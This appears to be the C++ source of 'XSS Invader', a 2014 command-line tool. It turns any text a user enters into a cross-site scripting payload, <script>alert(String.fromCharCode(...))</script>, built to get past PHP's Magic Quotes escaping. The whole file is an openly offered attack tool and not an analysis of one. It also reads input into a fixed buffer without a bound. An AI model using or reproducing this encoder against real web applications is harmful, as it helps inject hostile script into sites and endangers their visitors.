// ------------------------------------------------------------------------------------------
//        ,-~~-.___                  _   _     _                  ___                        |
//       / |  '    \            \ / (   (     |_                   |                         |
//      (  )        0            X   \   \    |  o | _|_  _  ._    |  ._      _.  _|  _  ._  |
//       \_/-, ,---'            / \  _)  _)   |  | |  |_ (/_ |    _|_ | | \/ (_| (_| (/_ |   |
//          ====           //                                                                |
//          /  \-'~;    /~~~(O) This is a payload encoder using fromCharCode() in JS to      |
//         /  __/~|   /       | bypass Magic Quotes directive in PHP.                        |
//       =(  _____| (_________|                                                              |
// Copyright (C) 2014 Osanda Malith Jayathissa                                               |
//                                                                                           |
// https://github.com/OsandaMalith/XSS-Invader                                               |
// ------------------------------------------------------------------------------------------

#ifdef _WIN64
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#endif

#ifdef _WIN32
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#endif

#ifdef __unix__
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#endif

using namespace std;

void invader (char *input);

int
main() {
    char option, input[500];
#ifdef _WIN64

    	system ("title Magic Quotes XSS Invader");
#endif
    do
    {
#ifdef _WIN64
    	system("cls");
#elif _WIN32
    	system("cls");
#elif __unix__
        system("clear");
#endif

        		cout << "\t\t\t_|      _|    _|_|_|    _|_|_|" << endl;
        		cout << "\t\t\t  _|  _|    _|        _|      " << endl;
        		cout << "\t\t\t    _|        _|_|      _|_|  " << endl;
        		cout << "\t\t\t  _|  _|          _|        _|" << endl;
        		cout << "\t\t\t_|      _|  _|_|_|    _|_|_|  " << endl << endl;
        		cout << "\t_|_|_|                                        _|                    " << endl;
        		cout << "\t  _|    _|_|_|    _|      _|    _|_|_|    _|_|_|    _|_|    _|  _|_|" << endl;
        		cout << "\t  _|    _|    _|  _|      _|  _|    _|  _|    _|  _|_|_|_|  _|_|    " << endl;
        		cout << "\t  _|    _|    _|    _|  _|    _|    _|  _|    _|  _|        _|      " << endl;
        		cout << "\t_|_|_|  _|    _|      _|        _|_|_|    _|_|_|    _|_|_|  _|   " << endl << endl;
        		cout << "\t[~] Author: Osanda Malith Jayathissa" <<endl;
        		cout << "\t[~] Follow @OsandaMalith" <<endl<<endl;
        		cout << "[+] Enter your payload: ";
        cin>>input;

        cout<<"<script>alert(String.fromCharCode(";
        invader(input);
        cout<<"));</script>"<<endl;
        cout<<"\n[?]Do you want to encode again? y/n"<<endl;
        cout<<">>";
        cin>>option;
        option=tolower(option);
    }
    while(option=='y');

    if (option != 'y')
#ifdef _WIN64
        MessageBox(NULL,TEXT("Coded by Osanda Malith\nFollow @OsandaMalith"),TEXT("Info"),MB_OK | MB_ICONASTERISK |MB_RTLREADING | MB_RIGHT );
#elif _WIN32
        MessageBox(NULL,TEXT("Coded by Osanda Malith\nFollow @OsandaMalith"),TEXT("Info"),MB_OK | MB_ICONASTERISK |MB_RTLREADING | MB_RIGHT );
#elif __unix__
    cout << "[~] Coded by Osanda Malith\n[*] Follow @OsandaMalith"<< endl;
#endif
    return 0;
}


void
invader(char *input) {
    int i = 0, dec, len = strlen(input);
    do {
        dec = (int) input[i];
        i++;
        cout << dec;
        if(i<len)
            cout << ',';
    }
    while(i < len);
}
